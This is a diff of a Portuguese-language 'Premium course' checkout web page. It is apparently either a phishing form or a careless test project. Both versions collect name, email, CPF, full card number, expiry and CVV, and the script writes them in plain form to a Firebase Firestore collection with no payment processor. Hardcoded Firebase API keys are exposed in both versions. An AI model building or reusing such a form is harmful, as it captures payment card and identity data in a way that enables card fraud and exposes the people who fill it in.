@@ -1,132 +1,49 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🚀 Curso Premium - Mude sua vida</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(to right, #e0f7fa, #fff);
-    }
-    .container {
-      max-width: 500px;
-      margin: 60px auto;
-      background: white;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 5px 25px rgba(0,0,0,0.1);
-    }
-    h1 {
-      font-size: 26px;
-      text-align: center;
-      color: #007bff;
-      margin-bottom: 25px;
-    }
-    input, button {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      font-size: 16px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      box-sizing: border-box;
-    }
-    button {
-      background-color: #28a745;
-      color: white;
-      font-weight: bold;
-      border: none;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    button:hover {
-      background-color: #218838;
-    }
-    .hidden {
-      display: none;
-    }
-    .success, .processing {
-      padding: 10px;
-      border-radius: 5px;
-      margin-top: 20px;
-      font-weight: bold;
-      text-align: center;
-      display: none;
-    }
-    .success {
-      background: #d4edda;
-      color: #155724;
-    }
-    .processing {
-      background: #fff3cd;
-      color: #856404;
-    }
-  </style>
-</head>
-<body>
-
-  <div class="container">
-    <h1>🎓 Inscreva-se agora no Curso Premium!</h1>
-
-    <!-- Etapa 1 -->
-    <div id="step1">
-      <input type="text" id="nome" placeholder="Seu nome completo" required />
-      <input type="email" id="email" placeholder="Seu e-mail" required />
-      <button onclick="mostrarPagamento()">Avançar ➡️</button>
-    </div>
-
-    <!-- Etapa 2 -->
-    <div id="step2" class="hidden">
-      <input type="text" id="cpf" placeholder="Seu CPF" required />
-      <input type="text" id="cartao" placeholder="Número do cartão" required />
-      <input type="text" id="validade" placeholder="Validade do cartão (MM/AA)" required />
-      <input type="text" id="cvv" placeholder="CVV (Código de segurança)" required />
-      <button onclick="finalizarCompra()">💳 Comprar agora</button>
-    </div>
-
-    <div id="mensagemProcessando" class="processing">
-      ⏳ Estamos processando seu pagamento. Aguarde...
-    </div>
-
-    <div id="mensagemSucesso" class="success">
-      ✅ Compra registrada com sucesso! Verifique seu e-mail.
-    </div>
-  </div>
-
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
-
+  <title>Finalizar Compra</title>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
   <script>
     const firebaseConfig = {
-      apiKey: "AIzaSyA5nKgYdMHQYFwWyxE5JYQWwEjKZ5S7mVo",
+      apiKey: "AIzaSyCtMHFdGj7-CRCIJ4kt0rHeNkGB1xv0f8A",
       authDomain: "testeapps-4440a.firebaseapp.com",
       projectId: "testeapps-4440a",
       storageBucket: "testeapps-4440a.appspot.com",
-      messagingSenderId: "609939982769",
-      appId: "1:609939982769:web:e4fbd7f7df1f4db8390e92"
+      messagingSenderId: "709928238723",
+      appId: "1:709928238723:web:4cfdb7aee64faad7b2b599"
     };
 
     firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+  </script>
+</head>
+<body>
+  <h2>Finalizar Compra</h2>
+  <form onsubmit="event.preventDefault(); finalizarCompra();">
+    <label for="cpf">CPF:</label><br>
+    <input type="text" id="cpf" name="cpf"><br><br>
+    <label for="cartao">Número do Cartão:</label><br>
+    <input type="text" id="cartao" name="cartao"><br><br>
+    <label for="validade">Validade (MM/AA):</label><br>
+    <input type="text" id="validade" name="validade"><br><br>
+    <label for="cvv">CVV:</label><br>
+    <input type="text" id="cvv" name="cvv"><br><br>
+    <input type="submit" value="Finalizar Compra">
+  </form>
 
-    function mostrarPagamento() {
-      const nome = document.getElementById('nome').value.trim();
-      const email = document.getElementById('email').value.trim();
+  <p id="mensagemProcessando" style="display:none;">Processando...</p>
+  <p id="mensagemSucesso" style="display:none; color: green;">Compra finalizada com sucesso!</p>
 
-      if (!nome || !email) {
-        alert("Preencha nome e e-mail para continuar.");
-        return;
-      }
+  <script>
+    // Simulação de dados anteriores salvos no navegador
+    localStorage.setItem("temp_nome", "Carlos Eduardo");
+    localStorage.setItem("temp_email", "carlos@email.com");
 
-      localStorage.setItem("temp_nome", nome);
-      localStorage.setItem("temp_email", email);
-
-      document.getElementById('step1').classList.add('hidden');
-      document.getElementById('step2').classList.remove('hidden');
+    function clearInputs() {
+      document.getElementById('cpf').value = '';
+      document.getElementById('cartao').value = '';
+      document.getElementById('validade').value = '';
+      document.getElementById('cvv').value = '';
     }
 
     function finalizarCompra() {
@@ -142,11 +59,10 @@
         return;
       }
 
-      // Mostra mensagem de carregamento
       document.getElementById('mensagemProcessando').style.display = 'block';
       document.getElementById('mensagemSucesso').style.display = 'none';
 
-      db.collection("compras").add({
+      firebase.firestore().collection("compras").add({
         nome: nome,
         email: email,
         cpf: cpf,
@@ -163,16 +79,9 @@
         clearInputs();
       })
       .catch((error) => {
-        alert("Erro ao registrar a compra: " + error);
+        alert("Erro ao registrar a compra: " + error.message);
         document.getElementById('mensagemProcessando').style.display = 'none';
       });
-    }
-
-    function clearInputs() {
-      document.getElementById('cpf').value = '';
-      document.getElementById('cartao').value = '';
-      document.getElementById('validade').value = '';
-      document.getElementById('cvv').value = '';
     }
   </script>
 </body>
